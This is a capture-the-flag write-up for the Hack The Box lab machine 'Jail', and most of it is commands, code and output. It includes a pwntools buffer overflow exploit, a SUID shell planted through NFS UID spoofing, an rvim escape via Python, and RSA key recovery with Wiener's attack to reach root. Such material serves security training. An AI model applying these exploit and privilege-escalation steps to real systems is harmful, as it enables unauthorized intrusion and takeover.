# HTB: Jail — Writeup

**Difficulty:** Insane | **OS:** Linux | **IP:** 10.10.10.34  
**Profile:** [MaikPro @ HackTheBox](https://app.hackthebox.com/profile/MaikPro)

---

## Summary

Jail is a multi-stage machine involving a stack buffer overflow with socket-reuse
shellcode against a custom network service, NFS misconfiguration abuse via UID
spoofing to plant a SUID binary, a restricted vim escape via Python, and finally
RSA private key recovery using Wiener's attack against a weak public key.

---

## Enumeration

### TCP Scan

```bash
nmap -sC -sV -oA nmap/jail 10.10.10.34
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 6.6.1p1
80/tcp    open  http     Apache httpd 2.4.6 (CentOS)
111/tcp   open  rpcbind  2-4
2049/tcp  open  nfs
7411/tcp  open  unknown  [custom jail service]
20048/tcp open  mountd
```

### NFS Export Enumeration

```bash
showmount -e 10.10.10.34
```

```
/opt          *(rw,sync,root_squash,no_all_squash)
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
```

`no_all_squash` — files created with a matching UID on the client are preserved
on the server. Critical for later exploitation.

Source code available at: `http://10.10.10.34/jailuser/dev/jail.c`

---

## Foothold — Stack Buffer Overflow (nobody shell)

### Vulnerability Analysis

From `jail.c`:

```c
char userpass[16];

int auth(char *username, char *password) {
    strcpy(userpass, password);  // no bounds check — stack overflow
    ...
}
```

Compiled with `-z execstack` — stack is executable. NX disabled.  
Hardcoded credentials found in source: `admin / 1974jailbreak!`

### Information Leak via DEBUG Mode

The service on port 7411 accepts a `DEBUG` command that leaks the buffer address:

```
nc 10.10.10.34 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
DEBUG
OK DEBUG mode on.
PASS AAAA
DEBUG: userpass buffer @ 0xffffd610
```

### Finding the Offset

```bash
msf-pattern_create -l 100
# Send output as PASS, capture crash EIP in gdb
msf-pattern_offset -l 100 -q <crashed_EIP>
# [*] Exact match at offset 28
```

### Exploit — Socket-Reuse Shellcode

TCP egress filtering blocks standard reverse shells. Use socket-reuse shellcode
to obtain a shell over the existing connection:

```python
from pwn import *

r = remote('10.10.10.34', 7411)
r.sendline('USER admin')
r.sendline('DEBUG')
r.recvuntil('buffer @ ')
buf_addr = int(r.recvline().strip(), 16)

payload  = b'A' * 28             # padding to EIP
payload += p32(buf_addr + 32)    # return into shellcode
payload += b'\x90' * 16          # NOP sled
payload += socket_reuse_shellcode

r.sendline(b'PASS ' + payload)
r.interactive()
# uid=99(nobody)
```

---

## Privilege Escalation — nobody → frank (NFS UID Spoofing)

`no_all_squash` on the NFS export preserves UID ownership. `frank` has UID 1000.
Create a matching local user on the attacker machine:

```bash
sudo useradd -u 1000 frank
sudo -u frank bash
sudo mount -t nfs 10.10.10.34:/var/nfsshare /tmp/nfs
```

Compile a SUID binary as UID 1000 and place it on the share:

```c
// shell.c
#include <stdlib.h>
int main() {
    setresuid(1000,1000,1000);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc -o /tmp/nfs/shell /tmp/shell.c
chmod 4777 /tmp/nfs/shell
```

In the `nobody` shell on the target:

```bash
/var/nfsshare/shell
# uid=1000(frank)
cat /home/frank/user.txt
```

**User flag captured.**

---

## Privilege Escalation — frank → adm (rvim Python Escape)

```bash
sudo -l
# (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

`rvim` restricts shell commands but Python is available:

```bash
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

Escape via Python inside rvim:

```vim
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec bash")
```

Shell as `uid=3(adm)`.

---

## Privilege Escalation — adm → root (RSA Wiener Attack)

```bash
ls /var/adm/.keys/
# note.txt  .local/  keys.rar

cat /var/adm/.keys/note.txt
# "Remember to use a strong password: LastName + Year + Symbol"

cat /var/adm/.keys/.local/.frank
# [Atbash cipher — decode at quipquip.com or manually]
# Decoded: "...Nobody will guess...Escaped from Alcatraz alive like I did!"
```

Frank Morris escaped Alcatraz in 1962.  
Password pattern: `LastName + Year + Symbol` → `Morris1962!`

```bash
unrar x keys.rar   # password: Morris1962!
# Extracts: rootauthorizedsshkey.pub
```

The public key uses a small private exponent — vulnerable to Wiener's theorem:

```bash
python RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private
# Recovers RSA private key
```

```bash
ssh -i recovered_private_key root@10.10.10.34
cat /root/root.txt
```

**Root flag captured.**

---

## Attack Chain

```
Port 7411 (jail service) + source code via HTTP
  → strcpy BOF — offset 28, execstack enabled
  → DEBUG mode leaks buffer address
  → socket-reuse shellcode → nobody shell
  → NFS no_all_squash + UID 1000 spoofing → SUID binary → frank shell
  → sudo rvim → :py os.execl() → adm shell
  → /var/adm/.keys/ → Atbash decode → Morris1962! → unrar
  → RSA Wiener attack → root private key → root.txt
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | TCP/UDP service enumeration |
| showmount | NFS export enumeration |
| msf-pattern_create | Buffer overflow offset calculation |
| pwntools | Exploit development and delivery |
| gcc | Compile SUID binary on attacker machine |
| rvim | Sudo escape vector via Python |
| RsaCtfTool | RSA Wiener's theorem attack |
| unrar | RAR archive extraction |

---

## CVEs & Techniques

| Reference | Description |
|-----------|-------------|
| CWE-121 | Stack-based buffer overflow (`strcpy` without bounds check) |
| — | NFS `no_all_squash` — UID spoofing for privilege escalation |
| — | Restricted editor (rvim) escape via Python `os.execl()` |
| — | Weak RSA — small private exponent, Wiener's theorem |
| — | Atbash substitution cipher |
| — | TCP egress bypass via socket-reuse shellcode |
